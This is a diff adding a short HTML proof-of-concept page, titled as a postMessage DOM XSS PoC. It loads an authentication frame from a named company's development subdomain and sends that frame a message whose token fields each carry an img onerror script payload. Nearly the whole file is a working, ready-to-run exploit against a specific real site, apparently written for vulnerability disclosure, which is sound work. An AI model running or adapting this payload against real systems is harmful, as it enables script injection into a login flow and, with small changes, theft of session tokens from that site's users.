@@ -1,0 +1,19 @@
+<!doctype html>
+        <html>
+            <head>
+                <meta charset="UTF-8" />
+                <title>Postmessage DOM XSS PoC</title>
+                <script>
+                 
+                    function Dom_Xss(win) {           
+                        let msg = "{\n    \"source\": \"LoginAuth\",\n    \"access_token\": \"\u003cimg src=xss onerror=alert(document.domain)\u003e-\",\n    \"expires_in\": \"\u003cimg src=xss onerror=alert(document.domain)\u003e-\",\n    \"id_token\":\"\u003cimg src=xss onerror=alert(document.domain)\u003e\"\n}";
+                        msg=JSON.parse(msg);
+                        win.postMessage(msg, '*');          
+                    }
+                </script>
+            </head>
+            <body>
+                        
+                <iframe src="https://auth-dev.pizzahut.com/frame.php" onload="Dom_Xss(this.contentWindow)"></iframe>                    
+            </body>
+        </html>
